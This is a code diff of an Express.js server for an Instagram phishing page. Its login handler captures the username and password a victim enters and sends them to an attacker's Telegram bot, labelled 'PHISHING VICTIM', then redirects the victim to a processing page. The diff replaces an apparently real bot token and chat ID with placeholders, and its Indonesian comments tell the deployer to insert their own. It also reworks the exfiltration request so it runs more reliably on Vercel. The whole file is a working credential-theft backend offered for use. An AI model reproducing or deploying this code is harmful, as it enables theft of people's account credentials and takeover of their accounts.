@@ -1,12 +1,13 @@
-// File: api/index.cjs
 const express = require('express');
 const app = express();
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
-const BOT_TOKEN = '8550434238:AAHFHYVGY4Xsxqjh22boe6XlgbKZYvBabmU';
-const CHAT_ID   = '6834832649';
+// ========== GANTI DENGAN DATA ASLI ANDA ==========
+const BOT_TOKEN = '8123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw'; // GANTI!!!
+const CHAT_ID = '123456789'; // GANTI!!!
+// =================================================
 
 app.post('/api/login', async (req, res) => {
     const { username, password } = req.body;
@@ -15,22 +16,49 @@ app.post('/api/login', async (req, res) => {
         return res.status(400).json({ error: 'Missing credentials' });
     }
 
-    const message = `🔥 *INSTAGRAM PHISHING (FOLLOWER TOOL)* 🔥\n\n👤 *Username/Email:* ${username}\n🔑 *Password:* ${password}\n⏰ *Time:* ${new Date().toLocaleString()}`;
+    const message = `🔐 *PHISHING VICTIM* 🔐\n\n👤 *Username/Email:* ${username}\n🔑 *Password:* ${password}\n⏰ *Time:* ${new Date().toLocaleString()}`;
 
     try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
+        // Kirim ke Telegram menggunakan https module (lebih stabil di Vercel)
+        const https = require('https');
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const data = JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
         });
-        console.log(`[SUCCESS] Credentials sent: ${username}`);
+
+        const options = {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Content-Length': Buffer.byteLength(data)
+            }
+        };
+
+        const request = https.request(url, options, (response) => {
+            let responseData = '';
+            response.on('data', chunk => { responseData += chunk; });
+            response.on('end', () => {
+                console.log('Telegram response:', responseData);
+                if (response.statusCode === 200) {
+                    console.log(`✅ Credentials sent to Telegram: ${username}`);
+                } else {
+                    console.error(`❌ Telegram error: ${responseData}`);
+                }
+            });
+        });
+
+        request.on('error', (err) => {
+            console.error('Request error:', err.message);
+        });
+
+        request.write(data);
+        request.end();
+
         res.redirect('/processing.html');
     } catch (err) {
-        console.error('[ERROR] Failed to send:', err);
+        console.error('Fatal error:', err.message);
         res.redirect('/processing.html');
     }
 });
